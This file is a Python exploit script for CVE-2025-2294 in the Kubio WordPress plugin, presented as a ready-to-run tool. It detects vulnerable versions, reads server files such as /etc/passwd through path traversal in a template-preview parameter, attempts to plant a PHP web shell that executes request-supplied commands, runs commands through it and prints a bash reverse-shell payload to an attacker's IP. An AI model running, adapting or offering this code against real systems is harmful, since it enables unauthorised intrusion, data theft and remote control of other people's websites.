import requests
import argparse
import time
import random
import string

session = requests.Session()
requests.packages.urllib3.disable_warnings()
session.verify = False

banner = """
  ____ ___ ____  _____      _    ____ ___   ___  _ ____  
 / ___|_ _|  _ \| ____|    / \  |  _ \_ _| / _ \| '_ \ \ 
| |    | || |_) |  _|     / _ \ | |_) | || | | | |_) |\ \ 
| |___ | ||  __/| |___   / ___ \|  __/| || |_| |  __/ / /
 \____|___|_|   |_____| /_/   \_\_|  |___|\___/|_|   /_/  
         CVE-2025-2294 Unauth LFI + WebShell by rHz0d
"""

def fetch_readme(url):
    target = f"{url}/wp-content/plugins/kubio/readme.txt"
    try:
        response = session.get(target, timeout=10)
        response.raise_for_status()
        return response.text
    except requests.RequestException:
        return None

def is_vulnerable(readme_content):
    for line in readme_content.splitlines():
        if "Stable tag:" in line:
            version = line.split(":")[-1].strip()
            major, minor, patch = map(int, version.split("."))
            if (major, minor, patch) <= (2, 5, 1):
                print(f"[+] Detected vulnerable version: {version}")
                return True
            break
    return False

def build_exploit_url(url, target_file):
    return f"{url}/?__kubio-site-edit-iframe-preview=1&__kubio-site-edit-iframe-classic-template={target_file}"

def send_exploit_request(full_url):
    try:
        response = session.get(full_url, timeout=10)
        response.raise_for_status()
        return response.text
    except requests.RequestException:
        return None

def display_result(content):
    if content:
        print("[+] Exploit successful. File content:")
        print(content)
    else:
        print("[-] Exploit failed or file not readable.")

def exploit(target_url, file_to_read):
    readme = fetch_readme(target_url)
    if readme and is_vulnerable(readme):
        print("[*] Attempting to read file...")
        exploit_url = build_exploit_url(target_url, file_to_read)
        result = send_exploit_request(exploit_url)
        display_result(result)
        return True
    else:
        print("[-] Target is not vulnerable or readme.txt not accessible.")
        return False

def upload_webshell(target_url):
    print("[*] Attempting to upload WebShell...")

    # 构造 PHP WebShell
    webshell_filename = ''.join(random.choices(string.ascii_lowercase, k=6)) + ".php"
    payload = "<?php if(isset($_REQUEST['cmd'])){echo '<pre>' . shell_exec($_REQUEST['cmd']) . '</pre>'; } ?>"
    upload_path = f"../../../../../../../../wp-content/uploads/{webshell_filename}"

    exploit_url = build_exploit_url(target_url, upload_path)
    try:
        response = session.post(exploit_url, data=payload, timeout=10)
        shell_url = f"{target_url}/wp-content/uploads/{webshell_filename}"
        print(f"[+] WebShell may be available at: {shell_url}")
        return shell_url
    except requests.RequestException:
        print("[-] Upload failed")
        return None

def execute_cmd_via_webshell(shell_url, cmd):
    try:
        print(f"[*] Executing command: {cmd}")
        response = session.get(shell_url, params={"cmd": cmd}, timeout=10)
        print(response.text)
    except requests.RequestException:
        print("[-] Command execution failed.")

def print_reverse_shell_payload(attacker_ip, port):
    print("[*] Reverse Shell Payload (bash):")
    payload = f"bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1"
    print(payload)

if __name__ == "__main__":
    print(banner)
    parser = argparse.ArgumentParser(description="CVE-2025-2294 Exploit Script")
    parser.add_argument("-u", "--url", required=True, help="Target base URL (e.g., https://example.com)")
    parser.add_argument("-f", "--file", default="../../../../../../../../etc/passwd", help="File to read")
    parser.add_argument("-c", "--cmd", help="Execute a command via uploaded WebShell")
    parser.add_argument("-r", "--reverse", nargs=2, metavar=('IP', 'PORT'), help="Show reverse shell command (no exec)")
    args = parser.parse_args()

    target_url = args.url.rstrip("/")

    # Step 1: 文件读取
    if exploit(target_url, args.file):
        time.sleep(2)

        # Step 2: 上传 WebShell
        shell = upload_webshell(target_url)

        if shell and args.cmd:
            time.sleep(1)
            execute_cmd_via_webshell(shell, args.cmd)

        # Step 3: 显示反弹命令
        if args.reverse:
            ip, port = args.reverse
            print_reverse_shell_payload(ip, port)
